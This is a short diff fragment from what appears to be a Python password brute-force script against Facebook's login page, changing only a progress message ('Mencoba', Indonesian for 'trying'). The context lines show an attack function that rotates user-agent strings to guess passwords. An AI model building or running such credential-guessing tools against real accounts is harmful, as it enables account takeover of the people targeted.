@@ -24,7 +24,7 @@ login = 'https://www.facebook.com/login.php?login_attempt=1'
 def attack(password):
 
   try:
-     sys.stdout.write("\r => Mencoba %s " % password)
+     sys.stdout.write("\r => Mencoba[>> %s " % password)
      sys.stdout.flush()
      br.addheaders = [('User-agent', random.choice(useragents))]
      site = br.open(login)
